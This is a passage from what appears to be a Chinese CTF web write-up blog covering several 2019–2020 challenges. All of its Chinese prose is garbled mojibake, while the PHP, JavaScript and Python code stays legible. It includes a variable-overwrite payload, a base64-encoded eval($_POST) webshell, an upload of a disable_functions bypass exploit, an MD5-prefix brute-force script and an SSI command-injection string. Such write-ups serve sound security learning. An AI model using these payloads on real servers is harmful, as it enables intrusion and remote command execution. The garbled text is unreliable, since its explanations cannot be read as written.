å…¥ä¸¤ä¸ªæ•°ç»„ï¼Œæ•°ç»„çš„å€¼ä¸ç›¸ç­‰ï¼Œé€ æˆMD5åŠ å¯†æ—¶æŠ¥é”™äº§ç”ŸNULL=NULLçš„æƒ…å†µï¼Œç»•è¿‡æ¯”è¾ƒã€‚</p><p>ç¬¬äºŒä¸ªä¸ºis_numericå‡½æ•°å¼±ç±»å‹ï¼Œç”¨<code>1234567abc</code>ç»•è¿‡ã€‚</p><h2 id="BJDCTF2020-Mark-loves-cat">BJDCTF2020 Mark loves cat</h2><h3 id="è€ƒç‚¹-v4">è€ƒç‚¹</h3><ul><li>Gitæºç æ³„éœ²</li><li>å˜é‡è¦†ç›–</li></ul><h3 id="è§£é¢˜-v4">è§£é¢˜</h3><p><strong>å…³é”®åœ¨äºè¦è®¤è¯†åˆ°<code>exit()</code>ä¹Ÿæ˜¯å¯ä»¥æ˜¯è¾“å‡ºçš„</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">$yds = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line">$is = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line">$handsome = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">&#x27;flag&#x27;</span>] === $x &amp;&amp; $x !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>($yds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || $_GET[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>($is);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.$flag;</span><br></pre></td></tr></table></figure><p>å…ˆæ¥åˆ†æä¸‰ä¸ªifè¯­å¥ï¼š</p><ol><li><p>ç¬¬ä¸€ä¸ªifè¯­å¥ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">&#x27;flag&#x27;</span>] === $x &amp;&amp; $x !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é”®åä¸ºflagçš„é”®å€¼ç»å¯¹ç­‰äºå…¶ä¸­æŸä¸€ä¸ªé”®å€¼ï¼Œå¹¶ä¸”é”®åä¸èƒ½æœ‰flagã€‚å‰åç›¸äº’çŸ›ç›¾ï¼Œè¿›ä¸å»è¿™ä¸ªåˆ¤æ–­ã€‚</p></li><li><p>ç¬¬äºŒä¸ªifè¯­å¥ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>($yds);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸å­˜åœ¨GETå‹çš„flagå‚æ•°ï¼Œä¹Ÿä¸å­˜åœ¨POSTå‹çš„flagå‚æ•°ã€‚</p></li><li><p>ç¬¬ä¸‰ä¸ªifè¯­å¥ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_POST[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || $_GET[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>($is);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>POSTå‹flagå‚æ•°å€¼ç»å¯¹ç­‰äºflagï¼ŒGETå‹flagå‚æ•°å€¼ç»å¯¹ç­‰äºflagã€‚</p></li></ol><p>å¦‚æœæƒ³é€šè¿‡ç¬¬äºŒä¸ªifè¯­å¥æ¥è¾“å‡ºflagçš„è¯ï¼Œå°±è¦å»è¦†ç›–<code>$flag</code>ï¼Œå³<code>$yds=$flag</code>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå°±å¯ä»¥ç›´æ¥GETä¼ å‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php?yds&#x3D;flag</span><br></pre></td></tr></table></figure><p>ç›¸å½“äº<code>$yds=$flag</code>ã€‚</p><p>å¦‚æœæƒ³é€šè¿‡ç¬¬ä¸‰ä¸ªifè¯­å¥æ¥è¾“å‡ºflagï¼Œå°±è¦å»è¦†ç›–<code>$is</code>ï¼Œå³<code>$is=$flag</code>ï¼Œå¹¶ä¸”GETä¸­è¦æœ‰flagå‚æ•°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php?is&#x3D;flag&amp;flag&#x3D;flag</span><br></pre></td></tr></table></figure><h2 id="GKCTF2020-CheckIN">GKCTF2020 CheckIN</h2><h3 id="è€ƒç‚¹-v5">è€ƒç‚¹</h3><ul><li>disable_functionç»•è¿‡</li></ul><h3 id="è§£é¢˜-v5">è§£é¢˜</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $code = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> $decode = <span class="literal">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;code = @<span class="keyword">$this</span>-&gt;x()[<span class="string">&#x27;Ginkgo&#x27;</span>];</span><br><span class="line">                <span class="keyword">$this</span>-&gt;decode = @base64_decode( <span class="keyword">$this</span>-&gt;code );</span><br><span class="line">                @<span class="keyword">Eval</span>(<span class="keyword">$this</span>-&gt;decode);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> $_REQUEST;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> ClassName();</span><br></pre></td></tr></table></figure><p>çœ‹ä¸€ä¸‹phpinfoï¼Œå‘ç°ç¦ç”¨äº†å¾ˆå¤šæ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ã€‚</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702101014.png" alt=""></p><p>å†™ä¸€ä¸ªshellç”¨èšå‰‘è¿æ¥ï¼Œ<code>eval($_POST[123]);</code>ï¼Œç»è¿‡base64ç¼–ç æ˜¯<code>ZXZhbCgkX1BPU1RbMTIzXSk7</code></p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702102011.png" style="zoom:67%;" /><p>æµè§ˆæ ¹ç›®å½•å‘ç°è¦ç”¨<code>readflag</code>è¯»å–flagæ–‡ä»¶ï¼Œä¸Šä¼ <a href="https://raw.githubusercontent.com/mm0r1/exploits/master/php7-gc-bypass/exploit.php">php7-diable_function-bypass</a> Pocè‡³/tmpç›®å½•ä¸‹ï¼Œç„¶åç”¨includeåŒ…å«è¯¥æ–‡ä»¶ï¼š</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702102424.png" alt=""></p><h2 id="GWCTF2019-æ¯ç‡¥çš„æŠ½å¥–">GWCTF2019 æ¯ç‡¥çš„æŠ½å¥–</h2><h3 id="è€ƒç‚¹-v6">è€ƒç‚¹</h3><h3 id="è§£é¢˜-v6">è§£é¢˜</h3><p>æŸ¥çœ‹æºä»£ç æœ‰ä¸€æ®µJSä»£ç </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $(<span class="string">&quot;#div1&quot;</span>).load(<span class="string">&quot;check.php #p1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        $(<span class="string">&quot;.close&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $(<span class="string">&quot;#myAlert&quot;</span>).hide();</span><br><span class="line">    &#125;);     </span><br><span class="line"></span><br><span class="line">    $(<span class="string">&quot;#button1&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $(<span class="string">&quot;#myAlert&quot;</span>).hide();</span><br><span class="line">    guess=$(<span class="string">&quot;input&quot;</span>).val();</span><br><span class="line">$.ajax(&#123;</span><br><span class="line">   type: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">   url: <span class="string">&quot;check.php&quot;</span>,</span><br><span class="line">   data: <span class="string">&quot;num=&quot;</span>+guess,</span><br><span class="line">   success: <span class="function"><span class="keyword">function</span>(<span class="params">msg</span>)</span>&#123;</span><br><span class="line">     $(<span class="string">&quot;#div2&quot;</span>).append(msg);</span><br><span class="line">     alertmsg = $(<span class="string">&quot;#flag&quot;</span>).text(); </span><br><span class="line">     <span class="keyword">if</span>(alertmsg==<span class="string">&quot;æ²¡æŠ½ä¸­å“¦ï¼Œå†è¯•è¯•å§&quot;</span>)&#123;</span><br><span class="line">      $(<span class="string">&quot;#myAlert&quot;</span>).attr(<span class="string">&quot;class&quot;</span>,<span class="string">&quot;alert alert-warning&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span>($(<span class="string">&quot;#new&quot;</span>).text()==<span class="string">&quot;&quot;</span>)</span><br><span class="line">     $(<span class="string">&quot;#new&quot;</span>).append(alertmsg);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span>&#123;     </span><br><span class="line">     $(<span class="string">&quot;#myAlert&quot;</span>).attr(<span class="string">&quot;class&quot;</span>,<span class="string">&quot;alert alert-success&quot;</span>);</span><br><span class="line">     <span class="keyword">if</span>($(<span class="string">&quot;#new&quot;</span>).text()==<span class="string">&quot;&quot;</span>)</span><br><span class="line">     $(<span class="string">&quot;#new&quot;</span>).append(alertmsg);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">   &#125;</span><br><span class="line">&#125;); </span><br><span class="line">$(<span class="string">&quot;#myAlert&quot;</span>).show();</span><br><span class="line">$(<span class="string">&quot;#new&quot;</span>).empty();</span><br><span class="line"> $(<span class="string">&quot;#div2&quot;</span>).empty();</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>å†å»çœ‹<code>check.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">ODuHdhCHWY</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#è¿™ä¸æ˜¯æŠ½å¥–ç¨‹åºçš„æºä»£ç ï¼ä¸è®¸çœ‹ï¼</span></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;seed&#x27;</span>]))&#123;</span><br><span class="line">$_SESSION[<span class="string">&#x27;seed&#x27;</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand($_SESSION[<span class="string">&#x27;seed&#x27;</span>]);</span><br><span class="line">$str_long1 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line">$str=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line">$str_show = substr($str, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.$str_show.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">&#x27;num&#x27;</span>]===$str)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;æŠ½å¥–ï¼Œå°±æ˜¯é‚£ä¹ˆæ¯ç‡¥ä¸”æ— å‘³ï¼Œç»™ä½ flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;æ²¡æŠ½ä¸­å“¦ï¼Œå†è¯•è¯•å§&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="string">&quot;check.php&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="BJDCTF2020-EasySearch">BJDCTF2020 EasySearch</h2><h3 id="è€ƒç‚¹-v7">è€ƒç‚¹</h3><ul><li>MD5æˆªæ–­éªŒè¯</li></ul><h3 id="è§£é¢˜-v7">è§£é¢˜</h3><p>ç”¨dirmapæ‰«ä¸€éï¼Œå‘ç°<code>index.php.swp</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ob_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_hash</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">$chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;</span><br><span class="line">$random = $chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)];<span class="comment">//Random 5 times</span></span><br><span class="line">$content = uniqid().$random;</span><br><span class="line"><span class="keyword">return</span> sha1($content); </span><br><span class="line">&#125;</span><br><span class="line">    header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> $_POST[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        $admin = <span class="string">&#x27;6d0bc1&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( $admin == substr(md5($_POST[<span class="string">&#x27;password&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            $file_shtml = <span class="string">&quot;public/&quot;</span>.get_hash().<span class="string">&quot;.shtml&quot;</span>;</span><br><span class="line">            $shtml = fopen($file_shtml, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">            $text = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,&#x27;</span>.$_POST[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">***&#x27;</span>;</span><br><span class="line">            fwrite($shtml,$text);</span><br><span class="line">            fclose($shtml);</span><br><span class="line">            ***</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;[!] Header  error ...&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">***</span><br><span class="line">    &#125;</span><br><span class="line">***</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä»£ç ç¬¬14è¡Œæ˜æ˜¾æ˜¯è€ƒå¯ŸMD5æˆªæ–­è®¤è¯ï¼Œç›´æ¥ç”¨è„šæœ¬çˆ†ç ´</p><blockquote><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/yesec/p/11297568.html">https://www.cnblogs.com/yesec/p/11297568.html</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> tp</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">knownMd5 = <span class="string">&#x27;6d0bc1&#x27;</span>      <span class="comment">#å·²çŸ¥çš„md5æ˜æ–‡</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">text</span>):</span> </span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(str(text).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findCode</span>(<span class="params">code</span>):</span>   </span><br><span class="line">    key = code.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    start = int(key[<span class="number">0</span>])  </span><br><span class="line">    end = int(key[<span class="number">1</span>]) </span><br><span class="line">    <span class="keyword">for</span> code <span class="keyword">in</span> range(start, end):</span><br><span class="line">        <span class="keyword">if</span> md5(code)[<span class="number">0</span>:<span class="number">6</span>] == knownMd5:            </span><br><span class="line">            <span class="keyword">print</span> code</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">list=[] </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):    <span class="comment">#è¿™é‡Œçš„range(number)æŒ‡çˆ†ç ´å‡ºå¤šå°‘ç»“æœåœæ­¢</span></span><br><span class="line">    list.append(str(<span class="number">10000000</span>*i) + <span class="string">&#x27;:&#x27;</span> + str(<span class="number">10000000</span>*(i+<span class="number">1</span>)))</span><br><span class="line">pool = tp()    <span class="comment">#ä½¿ç”¨å¤šçº¿ç¨‹åŠ å¿«çˆ†ç ´é€Ÿåº¦</span></span><br><span class="line">pool.map(findCode, list) </span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br></pre></td></tr></table></figure><p>å¾—åˆ°password:2020666</p><p>ç„¶åä»¥adminï¼Œ2020666ç™»å½•ï¼Œåœ¨headerä¸­å‘ç°éšæœºç”Ÿæˆçš„æ–‡ä»¶æ‰€åœ¨è·¯å¾„ã€‚è®¿é—®ä¹‹ï¼Œå‘ç°ç•Œé¢ä¸ºï¼š</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200705153955.png" alt=""></p><p>çœ‹åˆ°è¿™ä¸ªadminçŒœæµ‹è‚¯å®šæœ‰æ¨¡æ¿æ³¨å…¥ï¼Œä½†æ˜¯ç”¨<code>&#123;&#123;7*'7'&#125;&#125;</code>éªŒè¯ä¸€ç›´è¿”å›failï¼ŒæŸ¥é˜…wpå¾—çŸ¥æ˜¯SSIæ³¨å…¥ï¼ˆæˆ‘ä¹‹å‰éƒ½æ²¡å¬è¿‡ï¼‰ã€‚</p><blockquote><p>å¯ä»¥é€šè¿‡publicæ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶åç¼€å.shtmlå¾—åˆ°çº¿ç´¢</p><p><a href="https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">å‚è€ƒæ–‡ç« </a></p></blockquote><p>åœ¨usernameè®¾ç½®<code>&lt;!--#exec cmd=&quot;å‘½ä»¤&quot;--&gt;ï»¿</code>ï¼Œå³å¯æ‰§è¡Œå‘½ä»¤ã€‚</p><h3 id="æ‹“å±•-v2">æ‹“å±•</h3><p>å¦ä¸€ç§å½¢å¼çš„MD5æˆªæ–­éªŒè¯ï¼š</p><p><a href="https://www.cnblogs.com/yesec/p/11300841.html">https://www.cnblogs.com/yesec/p/11300841.html</a></p><h2 id="MRCTF2020-å¥—å¨ƒ">MRCTF2020 å¥—å¨ƒ</h2><h3 id="è€ƒç‚¹-v8">è€ƒç‚¹</h3><ul><li><code>$_SERVER['QUERY_STRING']</code>ç»•è¿‡</li><li>ä»£ç å®¡è®¡</li></ul><h3 id="è§£é¢˜-v8">è§£é¢˜</h3><h4 id="ç¬¬ä¸€å±‚">ç¬¬ä¸€å±‚</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1st</span></span><br><span class="line">$query = $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( substr_count($query, <span class="string">&#x27;_&#x27;</span>) !== <span class="number">0</span> || substr_count($query, <span class="string">&#x27;%5f&#x27;</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Y0u are So cutE!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>($_GET[<span class="string">&#x27;b_u_p_t&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; preg_match(<span class="string">&#x27;/^23333$/&#x27;</span>, $_GET[<span class="string">&#x27;b_u_p_t&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>é¢˜å¤–è¯ï¼š<code>$_SERVER['QUERY_STRING']</code>ä¸ä¼šè¿›è¡ŒURLDecodeï¼Œè€Œ<code>$_GET[]</code>ä¼šå°†å‚æ•°è¿›è¡ŒURLDecode</p></blockquote><p>åˆ©ç”¨PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§Bypassç¬¬ä¸€ä¸ªifè¯­å¥ã€‚</p><blockquote><p>å‚è€ƒæ–‡ç« ï¼š<a 